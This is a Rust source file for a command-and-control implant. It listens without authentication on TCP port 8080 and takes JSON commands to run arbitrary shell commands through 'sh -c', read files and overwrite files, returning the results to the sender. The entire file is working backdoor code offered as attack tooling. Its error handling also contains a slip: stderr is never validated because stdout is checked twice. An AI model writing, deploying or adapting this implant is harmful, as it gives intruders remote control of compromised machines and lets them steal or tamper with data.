use serde::{Deserialize, Serialize};
use std::fs::{self, read_to_string};
use std::io::{BufRead, BufReader, Write};
use std::net::{TcpListener, TcpStream};
use std::process::Command;
use std::thread::sleep;
use std::time::Duration;

#[derive(Deserialize, Serialize)]
enum C2Action {
    Execute(String),           // cmd
    ReadFile(String),          // path
    WriteFile(String, String), // Path, content
}

fn execute_command(cmd: String) -> Result<String, String> {
    let result = Command::new("sh").arg("-c").arg(cmd).output();
    match result {
        Ok(r) => {
            let stdout = String::from_utf8(r.stdout);
            if let Err(e) = stdout {
                return Err(format!("output of command is not valid utf8: {e}"));
            }
            let stderr = String::from_utf8(r.stderr);
            if let Err(e) = stdout {
                return Err(format!("output of command is not valid utf8: {e}"));
            }
            return Ok(format!(
                "stdout:\n{stdout:?}\n==============\nstderr:\n{stderr:?}"
            ));
        }
        Err(e) => Err(format!("error:{e}")),
    }
}

#[derive(Deserialize, Serialize)]
struct C2Message {
    action: C2Action,
}

fn listerner_init() -> TcpListener {
    loop {
        let port = 8080; // rand::random_range(1024..55000);
        let listener = TcpListener::bind(format!("0.0.0.0:{port}").as_str());
        match listener {
            Ok(l) => {
                return l;
            }
            Err(_) => {
                sleep(Duration::from_secs(10));
                continue;
            }
        }
    }
}

fn parse_message(stream: &mut TcpStream) -> Result<C2Message, String> {
    let mut reader = BufReader::new(stream);
    let mut message_str = String::new();
    if let Err(err) = reader.read_line(&mut message_str) {
        return Err(format!("failed to read message: {err}"));
    }

    if message_str.is_empty() {
        return Err("empty message".to_string());
    }

    match serde_json::from_str(&message_str) {
        Ok(msg) => Ok(msg),
        Err(_) => Err("".to_string()), // Err(format!("error deserialize message: {e}")),
    }
}

fn handle_connection(mut stream: TcpStream) {
    let c2_message = match parse_message(&mut stream) {
        Ok(msg) => msg,
        Err(_) => {
            return;
        }
    };

    match c2_message.action {
        C2Action::Execute(command) => {
            let response = match execute_command(command) {
                Ok(output) => output,
                Err(e) => format!("Execution error: {e}"),
            };
            if let Err(_) = stream.write_all(response.as_bytes()) {}
        }
        C2Action::ReadFile(filepath) => {
            let response = match read_to_string(filepath) {
                Ok(contents) => contents,
                Err(e) => format!("Read file error: {e}"),
            };
            if let Err(_) = stream.write_all(response.as_bytes()) {}
        }
        C2Action::WriteFile(filepath, input) => {
            let response = match fs::write(filepath, input) {
                Ok(_) => "Successfully wrote to file.".to_string(),
                Err(e) => format!("Write file error: {e}"),
            };
            if let Err(_) = stream.write_all(response.as_bytes()) {}
        }
    }
}

fn main() {
    let listener = listerner_init();

    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                _ = stream.peer_addr();
                std::thread::spawn(move || {
                    handle_connection(stream);
                });
            }
            Err(_) => {}
        }
    }
}
